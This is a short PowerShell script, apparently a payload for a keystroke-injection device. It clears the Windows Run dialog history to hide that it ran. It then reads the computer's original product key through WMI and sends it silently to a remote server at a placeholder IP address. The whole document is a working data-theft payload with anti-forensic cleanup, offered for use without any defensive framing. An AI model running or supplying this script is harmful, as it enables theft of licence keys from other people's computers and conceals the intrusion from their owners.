#Replace <REMOTE_IP_ADDRESS> with the actual IP address of the remote server hosting the script.


#Clear windows run dialog history
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force

#Retrieve and send the computer's original product key to a remote server
Invoke-WebRequest -Uri "http://<REMOTE_IP_ADDRESS>?duckey=$((Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey)" -Method Get -UseBasicParsing | Out-Null
